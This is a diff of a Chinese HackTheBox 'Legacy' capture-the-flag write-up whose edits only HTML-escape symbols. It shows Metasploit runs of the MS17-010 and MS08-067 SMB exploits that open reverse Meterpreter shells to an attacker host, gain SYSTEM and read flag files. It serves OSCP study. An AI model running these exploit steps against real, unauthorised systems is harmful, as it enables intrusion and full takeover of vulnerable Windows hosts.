@@ -1,7 +1,7 @@
 # HTB靶机 Legacy WriteUp
 
 
-<!--more-->
+&lt;!--more--&gt;
 
 备战OSCP系列，从HackTheBox靶场开始。
 
@@ -57,14 +57,14 @@ nmap扫描服务，需要用-Pn
  |   Computer name: legacy
  |   NetBIOS computer name: LEGACY\x00
  |   Workgroup: HTB\x00
- |_ System time: 2022-03-20T09:07:28+02:00
+ |_ System time: 2022-03-20T09:07:28&#43;02:00
  |_smb2-time: Protocol negotiation failed (SMB2)
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_ message_signing: disabled (dangerous, but default)
- |_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:8c:eb (VMware)
+ |_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:8c:eb (VMware)
  
 ```
 
@@ -118,7 +118,7 @@ nmap扫描服务，需要用-Pn
 
 ```shell
  $ msfconsole
- msf6 > search ms17-010
+ msf6 &gt; search ms17-010
  
  Matching Modules
  ================
@@ -134,68 +134,68 @@ nmap扫描服务，需要用-Pn
  
  Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
  
- msf6 > use exploit/windows/smb/ms17_010_psexec 
+ msf6 &gt; use exploit/windows/smb/ms17_010_psexec 
  [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
- msf6 exploit(windows/smb/ms17_010_psexec) > set rhosts 10.10.10.4
- rhosts => 10.10.10.4
- msf6 exploit(windows/smb/ms17_010_psexec) > set lhost 10.10.14.2
- lhost => 10.10.14.2
- msf6 exploit(windows/smb/ms17_010_psexec) > run
+ msf6 exploit(windows/smb/ms17_010_psexec) &gt; set rhosts 10.10.10.4
+ rhosts =&gt; 10.10.10.4
+ msf6 exploit(windows/smb/ms17_010_psexec) &gt; set lhost 10.10.14.2
+ lhost =&gt; 10.10.14.2
+ msf6 exploit(windows/smb/ms17_010_psexec) &gt; run
  
  [*] Started reverse TCP handler on 10.10.14.2:4444 
  [*] 10.10.10.4:445 - Target OS: Windows 5.1
  [*] 10.10.10.4:445 - Filling barrel with fish... done
- [*] 10.10.10.4:445 - <---------------- | Entering Danger Zone | ---------------->
+ [*] 10.10.10.4:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt;
  [*] 10.10.10.4:445 -   [*] Preparing dynamite...
  [*] 10.10.10.4:445 -           [*] Trying stick 1 (x86)...Boom!
- [*] 10.10.10.4:445 -   [+] Successfully Leaked Transaction!
- [*] 10.10.10.4:445 -   [+] Successfully caught Fish-in-a-barrel
- [*] 10.10.10.4:445 - <---------------- | Leaving Danger Zone | ---------------->
+ [*] 10.10.10.4:445 -   [&#43;] Successfully Leaked Transaction!
+ [*] 10.10.10.4:445 -   [&#43;] Successfully caught Fish-in-a-barrel
+ [*] 10.10.10.4:445 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;
  [*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x81e77660
  [*] 10.10.10.4:445 - Built a write-what-where primitive...
- [+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
+ [&#43;] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
  [*] 10.10.10.4:445 - Selecting native target
  [*] 10.10.10.4:445 - Uploading payload... CUwrRlZx.exe
  [*] 10.10.10.4:445 - Created \CUwrRlZx.exe...
- [+] 10.10.10.4:445 - Service started successfully...
+ [&#43;] 10.10.10.4:445 - Service started successfully...
  [*] Sending stage (175174 bytes) to 10.10.10.4
  [*] 10.10.10.4:445 - Deleting \CUwrRlZx.exe...
- [*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.4:1031 ) at 2022-03-1513:52:36 +0800
+ [*] Meterpreter session 1 opened (10.10.14.2:4444 -&gt; 10.10.10.4:1031 ) at 2022-03-1513:52:36 &#43;0800
  
- meterpreter > 
- meterpreter > getsystem 
+ meterpreter &gt; 
+ meterpreter &gt; getsystem 
  ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
- meterpreter > shell 
+ meterpreter &gt; shell 
  cd C:\Documents and Settings\john\Desktop
- C:\Documents and Settings\john\Desktop>more user.txt   
+ C:\Documents and Settings\john\Desktop&gt;more user.txt   
  more user.txt
  e69af0e4f443de7e36876fda4ec7644f
  
  cd C:\Documents and Settings\Administrator\Desktop
- C:\Documents and Settings\Administrator\Desktop>more root.txt
+ C:\Documents and Settings\Administrator\Desktop&gt;more root.txt
  more root.txt
  993442d258b0e0ec917cae9e695d5713
  
  # shell 进去太笨重了
- meterpreter > search -f user.txt
+ meterpreter &gt; search -f user.txt
  Found 1 result...
  =================
  Path                                             Size (bytes) Modified (UTC)
  ----                                             ------------  --------------
- c:\Documents and Settings\john\Desktop\user.txt  32            2017-03-16 14:19:49 +0800
+ c:\Documents and Settings\john\Desktop\user.txt  32            2017-03-16 14:19:49 &#43;0800
  
- meterpreter > cat "c:\Documents and Settings\john\Desktop\user.txt"
+ meterpreter &gt; cat &#34;c:\Documents and Settings\john\Desktop\user.txt&#34;
  e69af0e4f443de7e36876fda4ec7644
  
- meterpreter > search -f root.txt
+ meterpreter &gt; search -f root.txt
  Found 1 result...
  =================
  
  Path                                                     Size (bytes) Modified (UTC)
  ----                                                      ------------  --------------
- c:\Documents and Settings\Administrator\Desktop\root.txt  32            2017-03-1614:18:50 +0800
+ c:\Documents and Settings\Administrator\Desktop\root.txt  32            2017-03-1614:18:50 &#43;0800
  
- meterpreter > cat "c:\Documents and Settings\Administrator\Desktop\root.txt"
+ meterpreter &gt; cat &#34;c:\Documents and Settings\Administrator\Desktop\root.txt&#34;
  993442d258b0e0ec917cae9e695d5713
  
 ```
@@ -207,12 +207,12 @@ Kali `/usr/share/windows-binaries`目录下自带一些Windows下命令
 ### 2.ms08-067
 
 ```shell
- msf6 exploit(windows/smb/ms17_010_psexec) > use windows/smb/ms08_067_netapi
- msf6 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.10.10.4
- rhosts => 10.10.10.4
- msf6 exploit(windows/smb/ms08_067_netapi) > set lhost 10.10.14.2
- lhost => 10.10.14.2
- msf6 exploit(windows/smb/ms08_067_netapi) > run
+ msf6 exploit(windows/smb/ms17_010_psexec) &gt; use windows/smb/ms08_067_netapi
+ msf6 exploit(windows/smb/ms08_067_netapi) &gt; set rhosts 10.10.10.4
+ rhosts =&gt; 10.10.10.4
+ msf6 exploit(windows/smb/ms08_067_netapi) &gt; set lhost 10.10.14.2
+ lhost =&gt; 10.10.14.2
+ msf6 exploit(windows/smb/ms08_067_netapi) &gt; run
  
  [*] Started reverse TCP handler on 10.10.14.2:4444 
  [*] 10.10.10.4:445 - Automatically detecting the target...
@@ -220,12 +220,12 @@ Kali `/usr/share/windows-binaries`目录下自带一些Windows下命令
  [*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
  [*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
  [*] Sending stage (175174 bytes) to 10.10.10.4
- [*] Meterpreter session 2 opened (10.10.14.2:4444 -> 10.10.10.4:1032 ) at 2022-03-15 14:42:38 +0800
+ [*] Meterpreter session 2 opened (10.10.14.2:4444 -&gt; 10.10.10.4:1032 ) at 2022-03-15 14:42:38 &#43;0800
  
- meterpreter > 
- meterpreter > upload /usr/share/windows-binaries/whoami.exe
- meterpreter > shell
- C:\WINDOWS\system32>whoami
+ meterpreter &gt; 
+ meterpreter &gt; upload /usr/share/windows-binaries/whoami.exe
+ meterpreter &gt; shell
+ C:\WINDOWS\system32&gt;whoami
  whoami
  NT AUTHORITY\SYSTEM
  
@@ -236,7 +236,7 @@ Kali `/usr/share/windows-binaries`目录下自带一些Windows下命令
 ## 他山之玉
 
 - [Hackthebox walkthrough - Legacy（考点:smb利用 blue）](https://blog.csdn.net/weixin_45527786/article/details/105124115)：使用了另一个exp工具：[AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)，提到了WindowsXP系统没有whoami的问题。
-- [HackTheBox — Legacy Writeup](https://coldfusionx.github.io/posts/LegacyHTB/)：使用了MS08-067（python脚本）和MS07-010（python脚本+MSF），提到了`/usr/share/windows-binaries/`
+- [HackTheBox — Legacy Writeup](https://coldfusionx.github.io/posts/LegacyHTB/)：使用了MS08-067（python脚本）和MS07-010（python脚本&#43;MSF），提到了`/usr/share/windows-binaries/`
 - 在OSCP的进攻方认证考试中只允许对一台主机用msf，所以在测试的时候尽量避免用msf（直接用msf很low）
 
 
